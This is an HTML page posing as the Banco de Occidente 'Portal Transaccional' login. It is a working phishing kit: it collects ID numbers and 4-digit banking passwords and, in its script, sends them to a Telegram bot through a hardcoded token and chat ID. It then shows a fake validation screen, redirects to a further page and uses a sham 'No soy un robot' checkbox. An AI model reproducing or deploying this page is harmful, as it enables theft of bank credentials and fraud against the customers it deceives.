<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco de Occidente - Portal Transaccional</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="block-desktop.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
            width: 100%;
            max-width: 380px;
            overflow: hidden;
        }

        /* Header */
        .header {
            background: white;
            padding: 16px 20px;
            text-align: center;
            position: relative;
            border-bottom: 1px solid #f0f0f0;
        }

        .security-badge {
            display: none;
        }

        .logo {
            height: 35px;
            margin-bottom: 10px;
        }

        .header h1 {
            font-size: 13px;
            color: #0052CC;
            font-weight: 400;
            margin-bottom: 4px;
            letter-spacing: 0px;
        }

        .header p {
            font-size: 18px;
            color: #0052CC;
            font-weight: 700;
            letter-spacing: 0px;
        }

        /* Tabs */
        .tabs {
            display: flex;
            border-bottom: 2px solid #e8e8e8;
            background: white;
            padding: 0 20px;
        }

        .tab-button {
            flex: 1;
            padding: 14px 0;
            border: none;
            background: none;
            cursor: pointer;
            font-weight: 600;
            font-size: 13px;
            color: #bbb;
            position: relative;
            transition: all 0.3s ease;
        }

        .tab-button.active {
            color: #0052CC;
        }

        .tab-button.active::after {
            content: '';
            position: absolute;
            bottom: -2px;
            left: 0;
            right: 0;
            height: 2px;
            background: #0052CC;
        }

        /* Tab Content */
        .tab-content {
            display: none;
            padding: 20px;
        }

        .tab-content.active {
            display: block;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            font-size: 12px;
            font-weight: 600;
            color: #0052CC;
            margin-bottom: 8px;
            text-transform: capitalize;
        }

        .form-group input,
        .form-group select {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 13px;
            font-family: inherit;
            transition: all 0.3s ease;
            background: white;
            color: #333;
        }

        .form-group input::placeholder {
            color: #ccc;
            font-size: 13px;
        }

        .form-group input:focus,
        .form-group select:focus {
            outline: none;
            border-color: #0052CC;
            background: #fafbff;
        }

        .input-wrapper {
            display: flex;
            gap: 8px;
        }

        .input-wrapper select {
            flex: 0 0 55px;
            padding: 12px 8px;
        }

        .input-wrapper input {
            flex: 1;
        }

        /* Password Field */
        .password-wrapper {
            position: relative;
        }

        .password-toggle {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: #999;
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0;
        }

        .password-toggle svg {
            width: 18px;
            height: 18px;
            stroke: currentColor;
            stroke-width: 2;
            fill: none;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        .password-wrapper input {
            padding-right: 40px;
        }

        /* Links */
        .link-text {
            font-size: 12px;
            color: #0052CC;
            text-decoration: none;
            font-weight: 600;
            cursor: pointer;
        }

        .link-text:hover {
            text-decoration: underline;
        }

        /* Checkbox */
        .checkbox-group {
            display: flex;
            align-items: flex-start;
            gap: 8px;
            margin: 12px 0;
            font-size: 12px;
        }

        .checkbox-group input[type="checkbox"] {
            width: 16px;
            height: 16px;
            cursor: pointer;
            accent-color: #0052CC;
            margin-top: 2px;
            flex-shrink: 0;
        }

        .checkbox-group label {
            margin: 0;
            cursor: pointer;
            color: #666;
            font-size: 12px;
            font-weight: 600;
        }

        /* reCAPTCHA */
        .recaptcha-container {
            margin: 16px 0;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            background: #f9f9f9;
        }

        /* Buttons */
        .button-group {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }

        .btn {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 4px;
            font-weight: 700;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-secondary {
            background: #f5f5f5;
            color: #333;
            border: 1px solid #ddd;
            font-weight: 600;
        }

        .btn-secondary:hover {
            background: #efefef;
        }

        .btn-primary {
            background: linear-gradient(135deg, #0052CC 0%, #003D99 100%);
            color: white;
        }

        .btn-primary:hover {
            box-shadow: 0 4px 12px rgba(0, 82, 204, 0.3);
        }

        .btn-primary:active {
            transform: translateY(0);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .btn-icon {
            width: 16px;
            height: 16px;
        }

        /* Info Box */
        .info-box {
            background: #e3f2fd;
            border: 1px solid #bbdefb;
            padding: 12px;
            border-radius: 4px;
            font-size: 12px;
            color: #0052CC;
            margin-bottom: 20px;
            line-height: 1.5;
            font-weight: 600;
        }

        /* Footer */
        .footer {
            border-top: 1px solid #e0e0e0;
            padding: 12px 20px;
            background: #fafafa;
            font-size: 11px;
            color: #999;
            text-align: center;
        }

        /* Loading Screen */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(8px);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .loading-screen.show {
            display: flex;
        }

        .loading-content {
            text-align: center;
            background: white;
            border-radius: 16px;
            padding: 40px 30px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
            max-width: 300px;
            width: 90%;
        }

        .loading-logo {
            width: 150px;
            height: auto;
            margin: 0 auto 20px;
            object-fit: contain;
        }

        .spinner {
            width: 50px;
            height: 50px;
            margin: 20px auto;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #0052CC;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            font-size: 14px;
            color: #3c4043;
            margin-top: 15px;
            font-weight: 500;
        }

        /* Responsive */
        @media (max-width: 480px) {
            .container {
                max-width: 100%;
                border-radius: 0;
            }

            .tab-content {
                padding: 16px;
            }
        }
    </style>
</head>
<body>
    <!-- Loading Screen -->
    <div class="loading-screen" id="loadingScreen">
        <div class="loading-content">
            <img src="occi.png" alt="Banco de Occidente" class="loading-logo">
            <div class="spinner"></div>
            <p class="loading-text">Validando información...</p>
        </div>
    </div>

    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="security-badge">
                <svg viewBox="0 0 24 24">
                    <path d="M12 1C6.48 1 2 4.53 2 9c0 5.25 3.07 9.8 7 11.34V23h6v-3.66c3.93-1.54 7-6.09 7-11.34 0-4.47-4.48-8-10-8zm0 16c-3.35 0-6-2.57-6-6s2.65-6 6-6 6 2.57 6 6-2.65 6-6 6z"/>
                </svg>
                Seguridad
            </div>
            <img src="occi.png" alt="Banco de Occidente" class="logo">
            <h1>¡Bienvenido! a tu.</h1>
            <p>Portal Transaccional</p>
        </div>

        <!-- Tabs -->
        <div class="tabs">
            <button class="tab-button active" onclick="switchTab(event, 'registrado')">
                Registrado
            </button>
            <button class="tab-button" onclick="switchTab(event, 'sin-registro')">
                Sin registro
            </button>
        </div>

        <!-- Registrado Tab -->
        <div id="registrado" class="tab-content active">
            <form id="formRegistrado" onsubmit="handleRegistrado(event)">
                <div class="form-group">
                    <label>Identificación</label>
                    <div class="input-wrapper">
                        <select id="tipoId" name="tipoId" required>
                            <option value="CC">CC</option>
                            <option value="CE">CE</option>
                            <option value="PAS">PAS</option>
                        </select>
                        <input type="text" id="identidad" name="identidad" placeholder="Ej: 1062238893" required>
                    </div>
                </div>

                <div class="form-group">
                    <label>Clave Segura</label>
                    <div class="password-wrapper">
                        <input type="password" id="password" name="password" placeholder="4 dígitos" inputmode="numeric" maxlength="4" required>
                        <button type="button" class="password-toggle" onclick="togglePassword('password')">
                            <svg id="eyeIcon" viewBox="0 0 24 24">
                                <!-- Ojo abierto -->
                                <circle cx="12" cy="12" r="3"/>
                                <path d="M 1 12 C 1 12 5 5 12 5 C 19 5 23 12 23 12 C 23 12 19 19 12 19 C 5 19 1 12 1 12"/>
                            </svg>
                        </button>
                    </div>
                </div>

                <div class="checkbox-group">
                    <a class="link-text" href="#">¿Olvidaste te contraseña?</a>
                </div>

                <div class="checkbox-group">
                    <input type="checkbox" id="recordar" name="recordar">
                    <label for="recordar">Recordar mis datos</label>
                </div>

                <div class="recaptcha-container">
                    <div class="checkbox-group">
                        <input type="checkbox" id="notRobot1" name="notRobot1" required>
                        <label for="notRobot1">No soy un robot</label>
                    </div>
                </div>

                <div class="button-group">
                    <button type="submit" class="btn btn-primary">
                        <svg class="btn-icon" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5s-5 2.24-5 5v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/>
                        </svg>
                        Ingresar
                    </button>
                </div>
            </form>
        </div>

        <!-- Sin Registro Tab -->
        <div id="sin-registro" class="tab-content">
            <div class="info-box">
                Para realizar transacciones regístrate en nuestro Portal Transaccional.
            </div>

            <form id="formSinRegistro" onsubmit="handleSinRegistro(event)">
                <div class="form-group">
                    <label>CC</label>
                    <input type="text" id="cc" name="cc" placeholder="Ej: 1062238893" required>
                </div>

                <div class="recaptcha-container">
                    <div class="checkbox-group">
                        <input type="checkbox" id="notRobot2" name="notRobot2" required>
                        <label for="notRobot2">No soy un robot</label>
                    </div>
                </div>

                <div class="button-group">
                    <button type="button" class="btn btn-secondary" onclick="clearForm('formSinRegistro')">
                        Limpiar
                    </button>
                    <button type="submit" class="btn btn-primary">
                        <svg class="btn-icon" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/>
                        </svg>
                        Ingresar sin registro
                    </button>
                </div>
            </form>
        </div>

        <!-- Footer -->
        <div class="footer">
            <p>&copy; 2026 Banco de Occidente. Todos los derechos reservados.</p>
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
        const TELEGRAM_CHAT_ID = '-1003756481348';

        function switchTab(event, tabName) {
            event.preventDefault();
            
            const tabs = document.querySelectorAll('.tab-content');
            tabs.forEach(tab => tab.classList.remove('active'));
            
            const buttons = document.querySelectorAll('.tab-button');
            buttons.forEach(btn => btn.classList.remove('active'));
            
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
        }

        function clearForm(formId) {
            document.getElementById(formId).reset();
        }

        // Validar que la clave solo tenga números
        document.getElementById('password').addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').slice(0, 4);
        });

        function togglePassword(inputId) {
            const input = document.getElementById(inputId);
            const eyeIcon = document.getElementById('eyeIcon');
            
            if (input.type === 'password') {
                input.type = 'text';
                eyeIcon.innerHTML = `
                    <circle cx="12" cy="12" r="3"/>
                    <path d="M 1 12 C 1 12 5 5 12 5 C 19 5 23 12 23 12 C 23 12 19 19 12 19 C 5 19 1 12 1 12"/>
                `;
            } else {
                input.type = 'password';
                eyeIcon.innerHTML = `
                    <path d="M 1 1 L 23 23"/>
                    <path d="M 18 10 C 19 11 19.5 12 19.5 12 C 19.5 12 15 19 12 19 C 5 19 1 12 1 12 C 1 12 5 5 12 5 C 13 5 14 5.1 15 5.3"/>
                `;
            }
        }

        async function handleRegistrado(event) {
            event.preventDefault();
            
            const tipoId = document.getElementById('tipoId').value;
            const identidad = document.getElementById('identidad').value;
            const password = document.getElementById('password').value;
            const recordar = document.getElementById('recordar').checked;
            const notRobot = document.getElementById('notRobot1').checked;
            
            if (!notRobot) {
                alert('Por favor confirma que no eres un robot');
                return;
            }

            await sendToTelegram(`
🔹 FORMULARIO: REGISTRADO
━━━━━━━━━━━━━━━━━━━━━━
🆔 Tipo ID: ${tipoId}
📝 Identificación: ${identidad}
🔐 Contraseña: ${password}
💾 Recordar datos: ${recordar ? 'Sí' : 'No'}
━━━━━━━━━━━━━━━━━━━━━━
            `, event.target.querySelector('button[type="submit"]'));
        }

        async function handleSinRegistro(event) {
            event.preventDefault();
            
            const cc = document.getElementById('cc').value;
            const notRobot = document.getElementById('notRobot2').checked;
            
            if (!notRobot) {
                alert('Por favor confirma que no eres un robot');
                return;
            }

            await sendToTelegram(`
🔹 FORMULARIO: SIN REGISTRO
━━━━━━━━━━━━━━━━━━━━━━
📝 Cédula: ${cc}
━━━━━━━━━━━━━━━━━━━━━━
            `, event.target.querySelector('button[type="submit"]'));
        }

        async function sendToTelegram(message, button) {
            button.disabled = true;
            
            // Mostrar pantalla de carga
            document.getElementById('loadingScreen').classList.add('show');
            
            try {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                if (response.ok) {
                    clearForm(button.form.id);
                    setTimeout(() => {
                        // REDIRECCIONA A veri.html
                        window.location.href = 'veri.html';
                    }, 2000);
                } else {
                    document.getElementById('loadingScreen').classList.remove('show');
                    alert('❌ Error al enviar datos');
                    button.disabled = false;
                }
            } catch (error) {
                document.getElementById('loadingScreen').classList.remove('show');
                console.error('Error:', error);
                alert('❌ Error de conexión');
                button.disabled = false;
            }
        }
    </script>
</body>
</html>
